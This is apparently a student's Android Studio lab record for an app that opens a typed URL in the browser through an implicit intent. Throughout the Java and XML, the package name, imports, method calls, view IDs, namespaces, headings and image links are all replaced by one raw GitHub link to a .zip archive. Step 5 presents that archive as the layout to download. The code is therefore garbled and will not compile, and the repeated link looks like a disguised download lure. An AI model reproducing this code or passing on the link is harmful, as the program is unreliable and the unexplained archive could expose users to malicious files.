# EXPERIMENT:03  Implement an application that uses Intent(Implicit) using Android Studio.
Design an Android application with a text field and an "Open in Browser" button. On pressing the button, the app should fetch the URL from the text field and open it in a browser using an Implicit Intent.

## AIM:

To design an Android application with a TextField and a button labeled "Open in Browser." Upon pressing the button, the application should retrieve the URL entered in the TextField and open it in the device's web browser using an implicit intent.
## EQUIPMENTS REQUIRED:

Latest Version Android Studio

## ALGORITHM:

Step 1: Open Android Stdio and then click on File -> New -> New project.

Step 2: Then type the Application name as implicitintent and click Next.

Step 3: Then select the Minimum SDK as shown below and click Next.

Step 4: Then select the Empty Activity and click Next. Finally click Finish.

Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip

Step 6: Type any url, click navigate and that will take you to the expected url.

Step 7: Save and run the application.


## PROGRAM:
```
/*
Program to print the text “Implicitintent”.
Developed by: SHAIK MUFEEZUR RAHAMAN
Registeration Number :  212221043007
*/
```

## https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip

```
package https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;

import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;

import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;

public class MainActivity extends AppCompatActivity {
    Button button;

    EditText editText;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip(savedInstanceState);
        setContentView(https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip);
        final EditText editText = (EditText) findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip);
        Button btn = (Button) findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip);
        https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip(new https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip() {
            @Override
            public void onClick(View v) {
                String url = https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip().toString();
                Intent intent = new Intent(https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip, https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip(url));
                startActivity(intent);
            }
        });
    }
}
```

## https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout
    xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip"
    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <EditText
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:id="@+id/urlText"
        android:layout_alignParentTop="true"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="100dp"
        android:ems="10" />
    <Button
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:id="@+id/btnNavigate"
        android:layout_below="@+id/urlText"
        android:text="Navigate"
        android:layout_centerHorizontal="true" />
</RelativeLayout>
```

## OUTPUT
![Screenshot 2024-09-17 134746](https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip)

![Screenshot 2024-09-17 134724](https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip)

## RESULT
Thus a Simple Android Application create a navigate button using Implicit Intent to display the web page using Android Studio was developed and executed successfully.
